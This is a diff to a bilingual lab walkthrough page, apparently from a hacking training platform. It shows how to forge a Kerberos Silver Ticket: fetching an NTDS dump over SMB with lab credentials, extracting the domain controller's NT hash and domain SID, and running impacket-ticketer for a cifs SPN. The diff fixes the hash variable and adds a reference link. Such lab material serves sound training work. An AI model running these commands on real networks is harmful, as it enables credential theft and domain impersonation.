@@ -37,12 +37,12 @@ python3 verify_ticket.py Administrator.ccache '&lt;hash_NT_DC01$&gt;' Administra
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
 export DC_NT=$(grep '{{ ad_dc_host }}\$' ntds_dump.txt | cut -d: -f4)
 export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
-echo "DC01\$ hash: {{ ad_dc_ip }}_NT"
+echo "DC01\$ hash: $DC_NT"
 echo "Domain SID: $DOMSID"</pre>
 
     <h3>3 · Forjar el Silver Ticket</h3>
     <pre>impacket-ticketer \
-  -nthash "{{ ad_dc_ip }}_NT" \
+  -nthash "$DC_NT" \
   -domain-sid "$DOMSID" \
   -domain {{ ad_realm_lower }} \
   -spn 'cifs/{{ ad_dc_fqdn }}' \
@@ -61,7 +61,7 @@ klist</pre>
     <p>Descarga el script de verificación (descifra el ticket con la misma clave que usaste para forjarlo y confirma la identidad reclamada):</p>
     <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get verify_ticket.py'
 
-python3 verify_ticket.py Administrator.ccache "{{ ad_dc_ip }}_NT" Administrator</pre>
+python3 verify_ticket.py Administrator.ccache "$DC_NT" Administrator</pre>
     <pre>Ticket descifrado correctamente con la clave proporcionada.
 Identidad reclamada (cname): Administrator
 Realm: HACKLABS.LOCAL
@@ -80,6 +80,11 @@ OK: la clave descifra el ticket y confirma la identidad forjada.</pre>
 
     <h3>Herramientas</h3>
     <div><span class="tools-badge">impacket-ticketer</span> <span class="tools-badge">impacket-smbclient</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">mimikatz (kerberos::golden)</span></div>
+
+    <h3>Referencias</h3>
+    <ul>
+      <li><a href="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/active-directory-penetration-testing/ad-persistence" target="_blank" rel="noopener">Guía ampliada (GitBook) — AD Persistence</a></li>
+    </ul>
   </div>
 
   <div class="lang-content" data-lang="en" style="display:none">
@@ -90,12 +95,12 @@ OK: la clave descifra el ticket y confirma la identidad forjada.</pre>
     <pre>nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --share secrets --get-file ntds_dump.txt ntds_dump.txt
 export DC_NT=$(grep '{{ ad_dc_host }}\$' ntds_dump.txt | cut -d: -f4)
 export DOMSID=$(grep 'SID del dominio' ntds_dump.txt | awk '{print $NF}')
-echo "DC01\$ hash: {{ ad_dc_ip }}_NT"
+echo "DC01\$ hash: $DC_NT"
 echo "Domain SID: $DOMSID"</pre>
 
     <h3>3 · Forge the Silver Ticket</h3>
     <pre>impacket-ticketer \
-  -nthash "{{ ad_dc_ip }}_NT" \
+  -nthash "$DC_NT" \
   -domain-sid "$DOMSID" \
   -domain {{ ad_realm_lower }} \
   -spn 'cifs/{{ ad_dc_fqdn }}' \
@@ -114,7 +119,7 @@ klist</pre>
     <p>Download the verification script (decrypts the ticket with the same key you used to forge it and confirms the claimed identity):</p>
     <pre>smbclient -N //{{ ad_dc_ip }}/public -c 'get verify_ticket.py'
 
-python3 verify_ticket.py Administrator.ccache "{{ ad_dc_ip }}_NT" Administrator</pre>
+python3 verify_ticket.py Administrator.ccache "$DC_NT" Administrator</pre>
     <pre>Ticket descifrado correctamente con la clave proporcionada.
 Identidad reclamada (cname): Administrator
 Realm: HACKLABS.LOCAL
@@ -133,6 +138,11 @@ OK: la clave descifra el ticket y confirma la identidad forjada.</pre>
 
     <h3>Tools</h3>
     <div><span class="tools-badge">impacket-ticketer</span> <span class="tools-badge">impacket-smbclient</span> <span class="tools-badge">netexec (nxc)</span> <span class="tools-badge">mimikatz (kerberos::golden)</span></div>
+
+    <h3>References</h3>
+    <ul>
+      <li><a href="https://afsh4ck.gitbook.io/ethical-hacking-cheatsheet/introduccion/certificaciones/ecpptv3/active-directory-penetration-testing/ad-persistence" target="_blank" rel="noopener">Full guide (GitBook) — AD Persistence</a></li>
+    </ul>
   </div>
 </div>
 {% endblock %}
